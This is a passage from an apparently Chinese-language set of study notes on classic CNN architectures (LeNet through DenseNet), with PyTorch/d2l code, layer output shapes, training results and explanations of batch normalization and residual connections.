4 + 1) nn.AvgPool2d(kernel_size=2, stride=2), # 输出为 6 * 14 * 14(28 - 2 + 2)/2 nn.Conv2d(6, 16, kernel_size=5), nn.Sigmoid(), # 输出为 16 * 10 * 10(14 - 5 + 1 ) nn.AvgPool2d(kernel_size=2, stride=2), nn.Flatten(), # 输出为 1 * (16 * 5 * 5(10 - 2 + 2)/2) nn.Linear(16 * 5 * 5, 120), nn.Sigmoid(), nn.Linear(120, 84), nn.Sigmoid(), nn.Linear(84, 10))# TODO: 模拟训练，打印输出X = torch.rand(size=(1, 1, 28, 28), dtype=torch.float32)for layer in net: X = layer(X) print(layer.__class__.__name__, &#x27;output shape: \\t&#x27;, X.shape)# TODO: 尝试使用GPU训练Fashion-MNIST数据集batch_size = 256train_iter, test_iter = d2l.load_data_fashion_mnist(batch_size)# TODO: 模型评估函数def evaluate_accuracy_gpu(net, data_iter, device=None): if isinstance(net, nn.Module): net.eval() # 设置为评估模式 if not device: device = next(iter(net.parameters())).device # 计算预测的数量， 总预测的数量 metric = d2l.Accumulator(2) with torch.no_grad(): for X, y in data_iter: if isinstance(X, list): # 将样本移动到对应设备上 X = [x.to(device) for x in X] else: X = X.to(device) y = y.to(device) metric.add(d2l.accuracy(net(X), y), y.numel()) return metric[0] / metric[1]# TODO: 模型训练函数def train_ch6(net, train_iter, test_iter, num_epochs, lr, device): def init_weight(m): if type(m) == nn.Linear or type(m) == nn.Conv2d: nn.init.xavier_uniform_(m.weight) net.apply(init_weight) print(&#x27;training on&#x27;, device) # 将网络转移到设备 net.to(device) # 优化器 optimizer = torch.optim.SGD(net.parameters(), lr=lr) # 损失函数 loss = nn.CrossEntropyLoss() # 动画 animator = d2l.Animator(xlabel=&#x27;epoch&#x27;, xlim=[1, num_epochs], legend=[&#x27;train loss&#x27;, &#x27;train acc&#x27;, &#x27;test acc&#x27;]) timer, num_batches = d2l.Timer(), len(train_iter) # 训练 for epoch in range(num_epochs): metric = d2l.Accumulator(3) net.train() for i, (X, y) in enumerate(train_iter): # 开启计时器 timer.start() # 清空梯度 optimizer.zero_grad() X, y = X.to(device), y.to(device) y_hat = net(X) # 计算损失 l = loss(y_hat, y) # 梯度后向传播 l.backward() optimizer.step() with torch.no_grad(): metric.add(l*X.shape[0], d2l.accuracy(y_hat, y), X.shape[0]) timer.stop() train_l = metric[0] / metric[2] train_acc = metric[1] / metric[2] if (i + 1) % (num_batches // 5) == 0 or i == num_batches - 1: animator.add(epoch + (i + 1) / num_batches, (train_l, train_acc, None)) test_acc = evaluate_accuracy_gpu(net, test_iter) animator.add(epoch + 1, (None, None, test_acc)) print(f&#x27;loss &#123;train_l:.3f&#125;, train acc &#123;train_acc:.3f&#125;, &#x27; f&#x27;test acc &#123;test_acc:.3f&#125;&#x27;) print(f&#x27;&#123;metric[2] * num_epochs / timer.sum():.1f&#125; examples/sec &#x27; f&#x27;on &#123;str(device)&#125;&#x27;)lr, num_epochs = 0.9, 10train_ch6(net, train_iter, test_iter, num_epochs, lr, d2l.try_gpu())d2l.plt.show() 我们使用模拟数据查看以下各层的输出维度： 12345678910111213 Reshape output shape: torch.Size([1, 1, 28, 28])Conv2d output shape: torch.Size([1, 6, 28, 28])Sigmoid output shape: torch.Size([1, 6, 28, 28])AvgPool2d output shape: torch.Size([1, 6, 14, 14])Conv2d output shape: torch.Size([1, 16, 10, 10])Sigmoid output shape: torch.Size([1, 16, 10, 10])AvgPool2d output shape: torch.Size([1, 16, 5, 5])Flatten output shape: torch.Size([1, 400])Linear output shape: torch.Size([1, 120])Sigmoid output shape: torch.Size([1, 120])Linear output shape: torch.Size([1, 84])Sigmoid output shape: torch.Size([1, 84])Linear output shape: torch.Size([1, 10]) 在Fashion-MNIST数据集上的训练（GPU训练）效果如下： AlexNet 2000 - 2010年机器学习主流的方法是基于核方法的SVM，它对调参不敏感，且具有一套完整的论证方法。 ImageNet 2010年提出，自然物体的彩色图片大小为469 * 387，样本数为1.2M，类别数为1000，手写数字的黑白图片大小为28*28，样本数为60K，类别为10类。 AlexNet赢得了2012年ImageNet竞赛 是一个更深更大的LeNet 主要改进： 丢弃算法 ReLu MaxPooling 将计算机视觉的方法论更改为端到端的学习过程 Alex架构 将激活函数从Sigmoid转化为ReLu（延缓梯度消失） 隐藏全连接层后加入了丢弃层 对图片进行了数据增强 下面我们用PyTorch来实现一下AlexNet 1234567891011121314151617181920212223242526272829303132333435import torchfrom torch import nnfrom d2l import torch as d2lnet = nn.Sequential( # 这里，我们使用一个11*11的更大窗口来捕捉对象。 # 同时，步幅为4，以减少输出的高度和宽度。 # 另外，输出通道的数目远大于LeNet nn.Conv2d(1, 96, kernel_size=11, stride=4, padding=1), nn.ReLU(), nn.MaxPool2d(kernel_size=3, stride=2), # 减小卷积窗口，使用填充为2来使得输入与输出的高和宽一致，且增大输出通道数 nn.Conv2d(96, 256, kernel_size=5, padding=2), nn.ReLU(), nn.MaxPool2d(kernel_size=3, stride=2), # 使用三个连续的卷积层和较小的卷积窗口。 # 除了最后的卷积层，输出通道的数量进一步增加。 # 在前两个卷积层之后，汇聚层不用于减少输入的高度和宽度 nn.Conv2d(256, 384, kernel_size=3, padding=1), nn.ReLU(), nn.Conv2d(384, 384, kernel_size=3, padding=1), nn.ReLU(), nn.Conv2d(384, 256, kernel_size=3, padding=1), nn.ReLU(), nn.MaxPool2d(kernel_size=3, stride=2), nn.Flatten(), # 这里，全连接层的输出数量是LeNet中的好几倍。使用dropout层来减轻过拟合 nn.Linear(6400, 4096), nn.ReLU(), nn.Dropout(p=0.5), nn.Linear(4096, 4096), nn.ReLU(), nn.Dropout(p=0.5), # 最后是输出层。由于这里使用Fashion-MNIST，所以用类别数为10，而非论文中的1000 nn.Linear(4096, 10))# TODO: 读取数据batch_size = 128train_iter, test_iter = d2l.load_data_fashion_mnist(batch_size, resize=224)# TODO: 训练lr, num_epochs = 0.01, 10d2l.train_ch6(net, train_iter, test_iter, num_epochs, lr, d2l.try_gpu())d2l.plt.show() VGG VGG块 经典的卷积神经网络有以下几个部分组成： 带填充以保证分辨率的卷积层 非线性激活函数，入ReLU 池化层，如最大池化层 一个VGG块与之类似，有一系列卷积层组成，最后再加上用于空间下采样的最大汇聚层。 VGG块被定义为： n层，m个通道的kernel=3， padding=1的卷积层 一个kernel=2， stride=2的MaxPooling层 经过实验发现使用更深的小卷积核会比使用更浅的大卷积核效果更好，因此VGG块仍然使用了3*3的卷积核。 VGG架构 在多个VGG块后接全连接层，不同次数的重复快得到不同的架构VGG-16、VGG-19 VGG使用可重复使用的卷积块来构建深度卷积神经网络 不同的卷积块个数和超参数可以得到不同复杂度的变种 代码实现 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263import torchfrom torch import nnfrom d2l import torch as d2l# TODO: 构建VGG块def vgg_block(num_convs, in_channels, out_channels): layers = [] for _ in range(num_convs): layers.append(nn.Conv2d(in_channels, out_channels, kernel_size=3, padding=1)) layers.append(nn.ReLU()) in_channels = out_channels layers.append(nn.MaxPool2d(kernel_size=2, stride=2)) return nn.Sequential(*layers)# TODO: 设置一个VGG架构（经典五块式架构VGG-11）# 每通过一个块宽高减半，通道数翻一倍（第5层通道数不变conv_arch = ((1, 64), (1, 128), (2, 256), (2, 512), (2, 512))# TODO: VGG网络构造def vgg(conv_arch): conv_blocks = [] in_channels = 1 for (num_convs, out_channels) in conv_arch: conv_blocks.append(vgg_block( num_convs, in_channels, out_channels )) in_channels = out_channels return nn.Sequential( *conv_blocks, nn.Flatten(), # 输入为224的情况下经过卷积层图像大小不变 # 而池化层会将图像大小变为原来的一半 # 因此经过5次池化层后224*224的图像变为7*7 nn.Linear(out_channels * 7 * 7, 4096), nn.ReLU(), nn.Dropout(0.5), nn.Linear(4096, 4096), nn.ReLU(), nn.Dropout(0.5), nn.Linear(4096, 10) )net = vgg(conv_arch)# TODO: 查看每一层的输出情况X = torch.randn(size=(1, 1, 224, 224))for blk in net: X = blk(X) print(blk.__class__.__name__, &quot;output shape: \\t&quot;, X.shape)# 由于模型过于庞大，此处使用缩小的模型进行训练ratio = 4# 将通道数除以4small_conv_arch = [(pair[0], pair[1] // ratio) for pair in conv_arch]net = vgg(small_conv_arch)# TODO: 训练lr, num_epochs, batch_size = 0.05, 10, 128train_iter, test_iter = d2l.load_data_fashion_mnist(batch_size, resize=224)d2l.train_ch6(net, train_iter, test_iter, num_epochs, lr, d2l.try_gpu())d2l.plt.show() 每个块的输入情况如下： 12345678910111213Sequential output shape: torch.Size([1, 64, 112, 112])Sequential output shape: torch.Size([1, 128, 56, 56])Sequential output shape: torch.Size([1, 256, 28, 28])Sequential output shape: torch.Size([1, 512, 14, 14])Sequential output shape: torch.Size([1, 512, 7, 7])Flatten output shape: torch.Size([1, 25088])Linear output shape: torch.Size([1, 4096])ReLU output shape: torch.Size([1, 4096])Dropout output shape: torch.Size([1, 4096])Linear output shape: torch.Size([1, 4096])ReLU output shape: torch.Size([1, 4096])Dropout output shape: torch.Size([1, 4096])Linear output shape: torch.Size([1, 10]) 小模型训练的结果如下： 12loss 0.177, train acc 0.933, test acc 0.911679.1 examples/sec on cuda:0 NiN 根据计算，模型的参数大多出现在第一层全连接层中，那么我们希望使用卷积层去替代全连接层以达到降低模型复杂度，加快训练速度的目的。 NiN块 一个卷积层后跟两个全连接层： stride=1，输出形状与卷积层输出相同 起到全连接层的作用 即按照输入像素逐一连接的全连接层 NiN架构 无全连接层 交替使用NiN块和stride=2的MaxPooling层 逐步减小高宽和增大通道数 最后使用全局平均池化层得到输出（池化层核的高宽等于输入每一个通道的高宽） 输入通道数是类别数 代码实现 123456789101112131415161718192021222324252627282930313233343536373839404142434445import torchfrom torch import nnfrom d2l import torch as d2l# TODO: NiN块实现def nin_block(in_channels, out_channels, kernel_size, strides, padding): return nn.Sequential( nn.Conv2d(in_channels, out_channels, kernel_size, strides, padding), nn.ReLU(), nn.Conv2d(out_channels, out_channels, kernel_size=1), nn.ReLU(), nn.Conv2d(out_channels, out_channels, kernel_size=1), nn.ReLU() )# TODO: NiN模型net = nn.Sequential( nin_block(1, 96, kernel_size=11, strides=4, padding=0), nn.MaxPool2d(3, stride=2), nin_block(96, 256, kernel_size=5, strides=1, padding=2), nn.MaxPool2d(3, stride=2), nin_block(256, 384, kernel_size=3, strides=1, padding=1), nn.MaxPool2d(3, stride=2), nn.Dropout(0.5), # 标签类别数是10 nin_block(384, 10, kernel_size=3, strides=1, padding=1), nn.AdaptiveAvgPool2d((1, 1)), # 将四维的输出转成二维的输出，其形状为(批量大小，10) nn.Flatten())# TODO: 每个块的输出X = torch.rand(size=(1, 1, 224, 224))for layer in net: X = layer(X) print(layer.__class__.__name__, &#x27;output shape:\\t&#x27;, X.shape)# TODO: 训练lr, num_epochs, batch_size = 0.1, 10, 128train_iter, test_iter = d2l.load_data_fashion_mnist(batch_size, resize=224)d2l.train_ch6(net, train_iter, test_iter, num_epochs, lr, d2l.try_gpu())d2l.ply.show() GoogLeNet Inception块 四个路径从不同层面抽取信息，然后再输出通道维合并 Inception块不改变高宽，只改变通道数 既然我们要对各个通道的输出再维度上进行合并，那么我们就来看看每个路径输出的通道数是如何变化的： 其中更多的通道数意味着该条路径的权重更大。 使用Inception块的另一个重要原因是，与3*3或5 * 5 的直接卷积相比，Inception块具有更少的参数(同为输入192，输出256通道计算得到)： parameters FLOPS Inception 0.16M 128M 3*3 Conv 0.44M 346M 5*5 Conv 1.22M 963M GoogLeNet架构 5段，9个Inception块 此处Stage的划分是根据是否将高宽减半进行划分的 stage1&amp;2 stage3 stage4&amp;5 Inception各种变种 代码实现 对于GoogLeNet我们先实现Inception块，进而实现每一个Stage，最后将每一个Stage连接成一个网络： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475import torchfrom torch import nnfrom torch.nn import functional as Ffrom d2l import torch as d2lclass Inception(nn.Module): def __init__(self, in_channel, c1, c2, c3, c4, **kwargs): super(Inception, self).__init__(**kwargs) self.p1_1 = nn.Conv2d(in_channel, c1, kernel_size=1) self.p2_1 = nn.Conv2d(in_channel, c2[0], kernel_size=1) self.p2_2 = nn.Conv2d(c2[0], c2[1], kernel_size=3, padding=1) self.p3_1 = nn.Conv2d(in_channel, c3[0], kernel_size=1) self.p3_2 = nn.Conv2d(c3[0], c3[1], kernel_size=5, padding=2) self.p4_1 = nn.MaxPool2d(kernel_size=3, stride=1, padding=1) self.p4_2 = nn.Conv2d(in_channel, c4, kernel_size=1) def forward(self, x): p1 = F.relu(self.p1_1(x)) p2 = F.relu(self.p2_2(F.relu(self.p2_1(x)))) p3 = F.relu(self.p3_2(F.relu(self.p3_1(x)))) p4 = F.relu(self.p4_2(self.p4_1(x))) return torch.cat((p1, p2, p3, p4), dim=1)stage1 = nn.Sequential( nn.Conv2d(1, 64, kernel_size=7, stride=2, padding=3), nn.ReLU(), nn.MaxPool2d(kernel_size=3, stride=2, padding=1))stage2 = nn.Sequential( nn.Conv2d(64, 64, kernel_size=1), nn.ReLU(), nn.Conv2d(64, 192, kernel_size=3, padding=1), nn.ReLU(), nn.MaxPool2d(kernel_size=3, stride=2, padding=1),)stage3 = nn.Sequential( Inception(192, 64, (96, 128), (16, 32), 32), Inception(256, 128, (128, 192), (32, 96), 64), nn.MaxPool2d(kernel_size=3, stride=2, padding=1))stage4 = nn.Sequential( Inception(480, 192, (96, 208), (16, 48), 64), Inception(512, 160, (112, 224), (24, 64), 64), Inception(512, 128, (128, 256), (24, 64), 64), Inception(512, 112, (144, 288), (32, 64), 64), Inception(528, 256, (160, 320), (32, 128), 128), nn.MaxPool2d(kernel_size=3, stride=2, padding=1))stage5 = nn.Sequential( Inception(832, 256, (160, 320), (32, 128), 128), Inception(832, 384, (192, 384), (48, 128), 128), nn.AdaptiveAvgPool2d((1, 1)), nn.Flatten())net = nn.Sequential( stage1, stage2, stage3, stage4, stage5, nn.Linear(1024, 10))X = torch.rand(size=(1, 1, 96, 96))for layer in net: X = layer(X) print(layer.__class__.__name__, &#x27;output shape:\\t&#x27;, X.shape)lr, num_epochs, batch_size = 0.1, 10, 128train_iter, test_iter = d2l.load_data_fashion_mnist(batch_size, resize=96)d2l.train_ch6(net, train_iter, test_iter, num_epochs, lr, d2l.try_gpu()) 各层的参数如下： 123456Sequential output shape: torch.Size([1, 64, 24, 24])Sequential output shape: torch.Size([1, 192, 12, 12])Sequential output shape: torch.Size([1, 480, 6, 6])Sequential output shape: torch.Size([1, 832, 3, 3])Sequential output shape: torch.Size([1, 1024])Linear output shape: torch.Size([1, 10]) 12loss 0.256, train acc 0.903, test acc 0.8861072.1 examples/sec on cuda:0 批量归一化（Batch Normalization） 提出背景 随着神经网络的层级逐渐变深，对于网络的训练，越靠近输出的梯度越大，而越高金输入的梯度则会越小，因此会导致： 靠近输出（顶部）的层级训练快 靠近输入（底部）的层级训练缓慢 每次更新底层是会使得顶部也需要更新，导致顶部重新学习多次 导致收敛变慢 思想 固定小批量里的均值和方差。 首先计算出小批量的均值和方差： {μB=1∣B∣∑i∈BxiσB2=1∣B∣∑i∈B(xi−μB)2+ϵ\\begin{cases} \\mu_B = \\frac{1}{|B|} \\sum _{i \\in B} x_i \\\\ \\sigma ^ 2 _ B = \\frac{1}{|B|} \\sum _ {i \\in B} (x_i - \\mu_B)^2 + \\epsilon \\end{cases}{μB​=∣B∣1​∑i∈B​xi​σB2​=∣B∣1​∑i∈B​(xi​−μB​)2+ϵ​ 然后再做额外的调整（可学习的参数） xi+1=γxi−μBσB+βx_{i+1} = \\gamma \\frac{x_i - \\mu B}{\\sigma_B} + \\betaxi+1​=γσB​xi​−μB​+β 其中γ\\gammaγ为表示方差的参数，β\\betaβ为调整均值的参数 可学习参数γ\\gammaγ和β\\betaβ 作用： 全连接层和卷积层输出上，激活函数前 全连接层和卷积层输入上 对全连接层作用在特征维上 对于卷积层作用在通道维上（事实上通道维即卷积层的特征维） 批量归一化在做什么 最初论文想用它减少内部协变量的转移 后续有论文指出它可能就是通过在每个小批量里加入噪音来控制模型复杂度 xi+1=γxi−μ^Bσ^B+βx_{i+1} = \\gamma \\frac{x_i - \\hat \\mu_B}{\\hat \\sigma_B} + \\betaxi+1​=γσ^B​xi​−μ^​B​​+β 即由于每个mini-batch是随机取得，那么我们就可以认为μ^B\\hat \\mu_Bμ^​B​，即mini-batch的均值，和σ^B\\hat \\sigma_Bσ^B​，即mini-batch的方差，是两个随机数，它们分别对原样本进行了随即偏移和随机缩放 因此没必要跟丢弃法混合使用 总结 批量归一化固定小批量的均值和方差，然后学习出适合的偏移和缩放 可以加速收敛速度，但一般不改变模型精度 代码实现 首先实现batch norm的计算操作，然后实现Batch Norm层，接着将其加入LeNet中看效果： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100import torchfrom torch import nnfrom d2l import torch as d2ldef batch_norm(X, gamma, beta, moving_mean, moving_var, eps, momentum): &quot;&quot;&quot;批量归一化操作 Args: X (Tensor): 样本 gamma (Tensor): 参数1，代表方差 beta (Tensor): 参数2，代表均值 moving_mean (Tensor): 全局均值 moving_var (Tensor): 全局方差 eps (Tensor): 偏置值避免除0 momentum (float): 用于更新gamma和beta &quot;&quot;&quot; if not torch.is_grad_enabled(): # 对于预测模式下，使用全局均值和方差进行计算 X_hat = (X - moving_mean) / torch.sqrt(moving_var + eps) else: assert len(X.shape) in (2, 4) # 保证输入为2d全连接层或2d卷积层 if len(X.shape) == 2: mean = X.mean(dim=0) # 对哪一维求均值，哪一维就会变成1 var = ((X - mean) ** 2).mean(dim=0) else: # 沿通道数求均值，即结果为1 * n * 1 * 1的向量 mean = X.mean(dim=(0, 2, 3), keepdim=True) var = ((X - mean) ** 2).mean(dim=(0, 2, 3), keepdim=True) # 训练模式下使用当前批量的均值和方差进行计算 X_hat = (X - mean) / torch.sqrt(var + eps) # 更新移动平均的均值和方差 moving_mean = momentum * moving_mean + (1.0 - momentum) * mean moving_var = momentum * moving_var + (1.0 - momentum) * var Y = gamma * X_hat + beta return Y, moving_mean.data, moving_var.data# TODO: 定义BatchNorm层class BatchNorm(nn.Module): def __init__(self, num_features, num_dims): &quot;&quot;&quot;BatchNorm构造函数 Args: num_features (Tensor): 全连接层输出数量或卷积层输出通道数 num_dims (Tensor): 2表示全连接层，4表示卷积层 &quot;&quot;&quot; super().__init__() if num_dims == 2: shape = (1, num_features) else: shape = (1, num_features, 1, 1) self.gamma = nn.Parameter(torch.ones(shape)) self.beta = nn.Parameter(torch.zeros(shape)) self.moving_mean = torch.zeros(shape) self.moving_var = torch.ones(shape) def forward(self, X): if self.moving_mean.device != X.device: self.moving_mean = self.moving_mean.to(X.device) self.moving_var = self.moving_var.to(X.device) Y, self.moving_mean, self.moving_var = batch_norm( X, self.gamma, self.beta, self.moving_mean, self.moving_var, eps=1e-5, momentum=0.9) return Y# TODO: 应用BatchNorm于LeNet模型net = nn.Sequential( nn.Conv2d(1, 6, kernel_size=5), BatchNorm(6, num_dims=4), nn.Sigmoid(), nn.AvgPool2d(kernel_size=2, stride=2), nn.Conv2d(6, 16, kernel_size=5), BatchNorm(16, num_dims=4), nn.Sigmoid(), nn.AvgPool2d(kernel_size=2, stride=2), nn.Flatten(), nn.Linear(16*4*4, 120), BatchNorm(120, num_dims=2), nn.Sigmoid(), nn.Linear(120, 84), BatchNorm(84, num_dims=2), nn.Sigmoid(), # 输出层不需要加 nn.Linear(84, 10))lr, num_epochs, batch_size = 1.0, 10, 256train_iter, test_iter = d2l.load_data_fashion_mnist(batch_size)d2l.train_ch6(net, train_iter, test_iter, num_epochs, lr, d2l.try_gpu())d2l.plt.show()# TODO: 查看规范化层中查看学到的均值和方差net[1].gamma.reshape((-1,)), net[1].beta.reshape((-1,))# TODO: 使用torchAPInet = nn.Sequential( nn.Conv2d(1, 6, kernel_size=5), nn.BatchNorm2d(6), nn.Sigmoid(), nn.AvgPool2d(kernel_size=2, stride=2), nn.Conv2d(6, 16, kernel_size=5), nn.BatchNorm2d(16), nn.Sigmoid(), nn.AvgPool2d(kernel_size=2, stride=2), nn.Flatten(), nn.Linear(256, 120), nn.BatchNorm1d(120), nn.Sigmoid(), nn.Linear(120, 84), nn.BatchNorm1d(84), nn.Sigmoid(), nn.Linear(84, 10))d2l.train_ch6(net, train_iter, test_iter, num_epochs, lr, d2l.try_gpu()) 在LeNet上的结果： 12loss 0.264, train acc 0.902, test acc 0.83019296.8 examples/sec on cuda:0 查看学习到的均值和方差： 1234(tensor([0.3362, 4.0349, 0.4496, 3.7056, 3.7774, 2.6762], device=&#x27;cuda:0&#x27;, grad_fn=&lt;ReshapeAliasBackward0&gt;), tensor([-0.5739, 4.1376, 0.5126, 0.3060, -2.5187, 0.3683], device=&#x27;cuda:0&#x27;, grad_fn=&lt;ReshapeAliasBackward0&gt;)) ResNet 核心问题 随着层数的加深，网络一定会越来越好吗？ 模型偏差：指深度学习中，随着模型复杂的上升，学习得出的最优模型反而离目标模型更远的现象 如图所示的每一个FFF我们认为其是一类特定的神经网络框架，其包括学习率和其他超参数，那么我们可以通过学习从区域FFF中学习到一些函数，那么我们在FFF周围划定一些区域，代表所有f∈Ff \\in Ff∈F的集合，通常我们需要找到一个能够完美拟合我们的目标的函数∗f*f∗f。而事实往往没有那么幸运，我们也许只能在这些区域中找到一个近似函数∗fF*f_F∗fF​。 假设我们有一些具有X特性和y标签的数据，那么我们可以列出以下式子： ∗fF:=argminfL(X,y,f) subject tof∈F*f_F := argmin_{f}L(X,y,f) \\ subject \\ to f \\in F∗fF​:=argminf​L(X,y,f) subject tof∈F 如下图所示，如果我们此时需要设计一个比原模型更接近结果的模型，例如F2F_2F2​比F1F_1F1​更接近，那么假设其区域如图所示，，则随着模型不断的迭代我们将得到越来越复杂的模型，并在该模型上找到近似最终目标的解。但如果新的模型无法覆盖旧的模型，最终的结果可能离目标函数越来越远。 但如果更复杂的模型是完全包含以前的小模型的话： 那么我们的模型将随着复杂度的增加而向着目标模型接近。 残差块 残差块的思想是在模型的训练过程中扩大函数类，而不是训练新的函数。 残差快通过串联一个层来改变函数类，计入快速通道来得到f(x)=x+g(x)f(x) = x + g(x)f(x)=x+g(x)的结构 而实际使用中需要使用1*1的卷积层来调整输出的通道数： 完整的结构是： 高宽减半ResNet块（步幅为2） 后接多个高宽不变ResNet块 ResNet架构 类似GoogleNet的总体架构，分为了若干个Stage，但是其中的块替换为了ResNet块，最后添加了全局池化层。 ResNet整体结构 总结 残差快使得很深的网络更容易训练 残差网络对其后的网络设计产生了深远的影响，无论是卷积类网络还是全连接类网络 RestNet如何处理梯度消失 一个最基本的避免梯度消失的操作是将乘法变成加法。 首先假设我们预测的y=f(x)y = f(x)y=f(x)，此处为了方便讨论我们省略Loss，那么对于某一个层的参数的梯度计算为δyδw\\frac{\\delta y}{\\delta w}δwδy​，那么每次更新的公式为：w=w−ηδyδww = w - \\eta \\frac{\\delta y}{\\delta w}w=w−ηδwδy​ 根据这个式子，我们不希望梯度过小，导致w几乎不变。 现在我们考虑在f上增加一层: y′=g(f(x))y&#x27; = g(f(x))y′=g(f(x)) 那么它的导数为: δy′δw=δy′δyδyδw=δg(y)δyδyδw\\frac{\\delta y&#x27;}{\\delta w} = \\frac{\\delta{y&#x27;}}{\\delta y} \\frac{\\delta y}{\\delta w} = \\frac{\\delta g(y)}{\\delta y} \\frac{\\delta y}{\\delta w}δwδy′​=δyδy′​δwδy​=δyδg(y)​δwδy​ 那么对于这一乘法而言，如果每一项都比较小，即小于1，那么累乘的结果将会越来越小。 那么ResNet是怎么解决的呢? 事实上对于ResNet的下一层来说，它的形式是这样的： y′′=f(x)+g(f(x))y&#x27;&#x27; = f(x) + g(f(x))y′′=f(x)+g(f(x)) 则对它求导数将会得到： δy′′δw=δyδw+δy′δw\\frac{\\delta y&#x27;&#x27;}{\\delta w} = \\frac{\\delta y}{\\delta w} + \\frac{\\delta y&#x27;}{\\delta w}δwδy′′​=δwδy​+δwδy′​ 因此就算梯度很小，至少还有δyδw\\frac{\\delta y}{\\delta w}δwδy​这一项不会消失。 代码实现 同样我们首先实现残差块，该块有两种情况： 对于宽高减半，通道加倍的块，残差需要改变通道数 对于宽高不变的块，则不需要 接着，每一个Stage将包含两个残差快，除了Stage1以外，其余Stage的第一个残差快都需要将宽高减半。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889import torchfrom torch import nnfrom torch.nn import functional as Ffrom d2l import torch as d2l# TODO: 残差块class Residual(nn.Module): def __init__(self, input_channels, num_channels, use_1x1conv=False, strides=1): &quot;&quot;&quot;残差块初始化 Args: input_channels (int): 输入通道数 num_channels (int): 输出通道数 use_1x1conv (bool, 残差快控制): False关闭残差,True打开残差. Defaults to False. strides (int, optional): 步长. Defaults to 1. &quot;&quot;&quot; super().__init__() self.conv1 = nn.Conv2d(input_channels, num_channels, kernel_size=3, padding=1, stride=strides) self.conv2 = nn.Conv2d(num_channels, num_channels, kernel_size=3, padding=1) self.relu = nn.ReLU(inplace=True) if use_1x1conv: self.conv3 = nn.Conv2d( input_channels, num_channels, kernel_size=1, stride=strides) else: self.conv3 = None self.bn1 = nn.BatchNorm2d(num_channels) self.bn2 = nn.BatchNorm2d(num_channels) def forward(self, X): Y = F.relu(self.bn1(self.conv1(X))) Y = self.bn2(self.conv2(Y)) if self.conv3: X = self.conv3(X) Y += X return F.relu(Y)# TODO: 通道数不变的残差块blk = Residual(3, 3)X = torch.rand(4, 3, 6, 6)Y = blk(X)print(Y.shape)# TODO: 通道数减半的残差块blk = Residual(3, 6, use_1x1conv=True, strides=2)print(blk(X).shape)b1 = nn.Sequential( nn.Conv2d(1, 64, kernel_size=7, stride=2, padding=3), nn.BatchNorm2d(64), nn.ReLU(), nn.MaxPool2d(kernel_size=3, stride=2, padding=1))def resnet_block(input_channels, num_channels, num_residuals, first_block=False): blk = [] for i in range(num_residuals): if i == 0 and not first_block: blk.append(Residual(input_channels, num_channels, use_1x1conv=True, strides=2)) else: blk.append(Residual(num_channels, num_channels)) return blkb2 = nn.Sequential(*resnet_block(64, 64, 2, first_block=True))b3 = nn.Sequential(*resnet_block(64, 128, 2))b4 = nn.Sequential(*resnet_block(128, 256, 2))b5 = nn.Sequential(*resnet_block(256, 512, 2))net = nn.Sequential(b1, b2, b3, b4, b5, nn.AdaptiveAvgPool2d( (1, 1)), nn.Flatten(), nn.Linear(512, 10))# TODO: 输出各层规模X = torch.rand(size=(1, 1, 224, 224))for layer in net: X = layer(X) print(layer.__class__.__name__, &#x27;output shape:\\t&#x27;, X.shape)# TODO: 训练lr, num_epochs, batch_size = 0.05, 10, 256train_iter, test_iter = d2l.load_data_fashion_mnist(batch_size, resize=96)d2l.train_ch6(net, train_iter, test_iter, num_epochs, lr, d2l.try_gpu())d2l.plt.show() 首先来看一下两类残差快对输出的变化： 123# 输入为4, 3, 6, 6维向量torch.Size([4, 3, 6, 6])torch.Size([4, 6, 3, 3]) 可见第一类残差块的通道数和宽高并未发生变化 使用第二类残差块会将高宽减半，通道数加倍 而每一个Stage的输出结构如下： 可见第一个Stage将224维1通道的输入经过7*7卷积和3 * 3池化降到了56 * 56并将通道数变为64。 而第二个Stage并没有将通道数变化。 之后每一个Stage都会将通道数加倍，宽高减半。 12345678Sequential output shape: torch.Size([1, 64, 56, 56])Sequential output shape: torch.Size([1, 64, 56, 56])Sequential output shape: torch.Size([1, 128, 28, 28])Sequential output shape: torch.Size([1, 256, 14, 14])Sequential output shape: torch.Size([1, 512, 7, 7])AdaptiveAvgPool2d output shape: torch.Size([1, 512, 1, 1])Flatten output shape: torch.Size([1, 512])Linear output shape: torch.Size([1, 10]) 最后训练结果如下： 12loss 0.010, train acc 0.998, test acc 0.9151533.6 examples/sec on cuda:0 DenseNet 思想 DenseNet是在ResNet上的逻辑展开，对于ResNet而言，他是将函数展开为： f(x)=x+g(x)f(x) = x + g(x)f(x)=x+g(x) 而DenseNet则是借用了泰勒展开的思想： f(x)=f(0)+f′(0)x+f′′(0)2!x2+f′′′(0)3!x3+...f(x) = f(0) + f&#x27;(0)x + \\frac{f&#x27;&#x27;(0)}{2!} x^2 + \\frac{f&#x27;&#x27;&#x27;(0)}{3!}x^3 + ...f(x)=f(0)+f′(0)x+2!f′′(0)​x2+3!f′′′(0)​x3+... DenseNet将ResNet中重新加上输入的操作变更为了与输入进行连接： 此处我们使用[,]来表示这种连接操作，而不是简单相加，因此我们执行从x到其展开式的映射： x→[x,f1(x),f2([x,f1(x)]),f3([x,f1(x),f2([x,f1(x)])]),...].x \\to [x, f_1(x), f_2([x,f_1(x)]),f_3([x,f_1(x),f_2([x,f_1(x)])]), ...].x→[x,f1​(x),f2​([x,f1​(x)]),f3​([x,f1​(x),f2​([x,f1​(x)])]),...]. 最后，将这些展开式结合到MLP中即转化为稠密连接： DenseNet主要由两部分构成： 稠密快Dense Block 过渡层Transition Layer 前者定义如何连接输入输出，后者则控制通道数量，使其不会过于复杂。 代码实现 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109import torchfrom torch import nnfrom d2l import torch as d2l# 使用 BN ReLU CONV架构，该思想来自于ResNet论文中的后续版本改进# TODO: 构造卷积块def conv_block(input_channels, num_channels): return nn.Sequential( nn.BatchNorm2d(input_channels), nn.ReLU(), nn.Conv2d(input_channels, num_channels, kernel_size=3, padding=1) )# TODO: 构建稠密块class DenseBlock(nn.Module): &quot;&quot;&quot;稠密块 Deception: 该块由多个卷积块构成，每个卷积块使用相同数量的输出通道。 然而，在前向传播中，我们将每个卷积块的输入和输出在通道维度上连结。 &quot;&quot;&quot; def __init__(self, 